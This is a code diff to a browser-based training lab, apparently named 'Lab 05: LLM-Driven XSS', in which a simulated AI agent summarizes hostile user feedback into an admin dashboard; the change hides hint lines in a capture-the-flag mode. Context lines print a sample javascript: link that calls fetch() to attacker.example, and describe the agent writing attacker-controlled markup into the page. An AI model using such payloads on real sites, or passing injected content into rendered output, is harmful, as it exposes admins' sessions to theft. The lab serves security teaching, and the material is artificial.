@@ -207,7 +207,7 @@
     await typeOut('[agent] Summary posted. Looks clean.', 'agent');
     write('', 'out');
     write('[+] Step 1 complete. The widget rendered the summary safely.', 'ok');
-    write('    Try: continue', 'muted');
+    if (MODE !== "ctf") write('    Try: continue', 'muted');
     setStep(2);
   }
 
@@ -226,7 +226,7 @@
     await typeOut('[runtime] DOM contains: <a href="javascript:fetch(\'https://attacker.example/c?...\')">the migration guide</a>', 'warn');
     await sleep(180);
     writeRaw('<span class="hilite-payload">[!!] every admin who clicks the "migration guide" link runs JS in the dashboard origin.</span>', 'danger');
-    write('    Try: continue', 'muted');
+    if (MODE !== "ctf") write('    Try: continue', 'muted');
     state.compromised = true;
     setStatus('LINK XSS PRESENT', true);
     setStep(3);
@@ -266,7 +266,7 @@
     setRendered(md);
     await sleep(280);
     writeRaw('<span class="hilite-payload">[!!] the agent wrote attacker-controlled markup straight into the rendered page.</span>', 'danger');
-    write('    Same trust failure as Lab 01, different output sink. Try: continue', 'muted');
+    if (MODE !== "ctf") write('    Same trust failure as Lab 01, different output sink. Try: continue', 'muted');
     setStep(5);
   }
 
@@ -337,7 +337,7 @@
     }
     if (c === 'continue' || c === 'next' || c === 'go') {
       if (state.step === 1) {
-        write('Run the baseline first. Try: claude "summarize today\'s feedback"', 'warn');
+        if (MODE !== "ctf") write('Run the baseline first. Try: claude "summarize today\'s feedback"', 'warn');
         return;
       }
       if (state.step === 2) return step2_markdownLink();
@@ -377,14 +377,19 @@
   function banner() {
     write("Aaron's Rogue Agent Lab; Lab 05: LLM-Driven XSS", 'ok');
     write('-----------------------------------------------', 'muted');
+    if (MODE === 'ctf') {
+      write("mode: normal :: see Mission panel for objective + hints", 'muted');
+      write('', 'out');
+      return;
+    }
     write('Scenario: an internal admin dashboard widget summarizes user', 'out');
     write('feedback. The summary is rendered as HTML (markdown converted).', 'out');
     write('The feedback queue contains a mix of benign and hostile items.', 'out');
     write('Each step demonstrates a different way agent output ends up', 'out');
     write('executing attacker code in the admin\'s browser.', 'out');
     write('', 'out');
-    writeRaw('Step 1: Try   :   claude "summarize today\'s feedback"', 'info');
-    write("Help:  type   :   help", 'muted');
+    if (MODE !== "ctf") writeRaw('Step 1: Try   :   claude "summarize today\'s feedback"', 'info');
+    if (MODE !== "ctf") write("Help:  type   :   help", 'muted');
     write('', 'out');
   }
 
